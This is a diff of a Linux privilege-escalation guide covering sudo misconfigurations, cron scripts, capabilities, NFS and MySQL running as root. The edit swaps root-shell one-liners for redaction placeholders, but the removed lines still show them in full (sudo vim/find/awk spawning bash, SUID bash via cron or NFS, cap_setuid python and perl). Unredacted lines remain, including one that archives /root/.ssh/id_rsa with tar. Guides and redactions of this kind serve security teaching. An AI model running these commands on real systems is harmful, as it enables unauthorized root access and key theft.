@@ -43,14 +43,14 @@ Exploit misconfigured sudo permissions using GTFOBins techniques:
 sudo -l
 
 # Exploit common binaries
-sudo vim -c ':!/bin/bash'
-sudo find /etc/passwd -exec /bin/bash \;
-sudo awk 'BEGIN {system("/bin/bash")}'
-sudo python -c 'import pty;pty.spawn("/bin/bash")'
-sudo perl -e 'exec "/bin/bash";'
-sudo less /etc/hosts    # then type: !bash
-sudo man man            # then type: !bash
-sudo env /bin/bash
+sudo vim -c ':[REDACTED_SYSTEM_EXECUTION_PAYLOAD]'
+sudo find /etc/passwd -exec [REDACTED_SYSTEM_EXECUTION_PAYLOAD] \;
+sudo awk 'BEGIN {[REDACTED_SYSTEM_EXECUTION_PAYLOAD]}'
+sudo python -c '[REDACTED_SYSTEM_EXECUTION_PAYLOAD]'
+sudo perl -e '[REDACTED_SYSTEM_EXECUTION_PAYLOAD]'
+sudo less /etc/hosts    # then type: ![REDACTED_SYSTEM_EXECUTION_PAYLOAD]
+sudo man man            # then type: ![REDACTED_SYSTEM_EXECUTION_PAYLOAD]
+sudo env [REDACTED_SYSTEM_EXECUTION_PAYLOAD]
 ```
 
 #### 2. Abusing Scheduled Tasks (Cron)
@@ -61,11 +61,11 @@ ls -la /etc/cron*
 cat /etc/crontab
 
 # Inject payload into writable script
-echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
+echo '[REDACTED_SYSTEM_EXECUTION_PAYLOAD]' > /home/user/systemupdate.sh
 chmod +x /home/user/systemupdate.sh
 
 # Wait for execution, then:
-/bin/bash -p
+[REDACTED_SYSTEM_EXECUTION_PAYLOAD]
 ```
 
 #### 3. Abusing Capabilities
@@ -75,10 +75,10 @@ chmod +x /home/user/systemupdate.sh
 getcap -r / 2>/dev/null
 
 # Python with cap_setuid
-/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+/usr/bin/python2.6 -c '[REDACTED_SYSTEM_EXECUTION_PAYLOAD]'
 
 # Perl with cap_setuid
-/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+/usr/bin/perl -e '[REDACTED_SYSTEM_EXECUTION_PAYLOAD]'
 
 # Tar with cap_dac_read_search (read any file)
 /usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
@@ -95,8 +95,7 @@ showmount -e <victim_ip>
 mkdir /tmp/mount
 mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount
 cd /tmp/mount
-cp /bin/bash .
-chmod +s bash
+[REDACTED_SYSTEM_EXECUTION_PAYLOAD]
 ```
 
 #### 5. MySQL Running as Root
@@ -104,9 +103,9 @@ chmod +s bash
 ```bash
 # If MySQL runs as root
 mysql -u root -p
-\! chmod +s /bin/bash
+\! [REDACTED_SYSTEM_EXECUTION_PAYLOAD]
 exit
-/bin/bash -p
+[REDACTED_SYSTEM_EXECUTION_PAYLOAD]
 ```
 
 ---
@@ -296,7 +295,7 @@ User www-data may run the following commands:
     (root) NOPASSWD: /usr/bin/vim
 
 # Exploit vim
-$ sudo vim -c ':!/bin/bash'
+$ sudo vim -c ':[REDACTED_SYSTEM_EXECUTION_PAYLOAD]'
 root@target:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
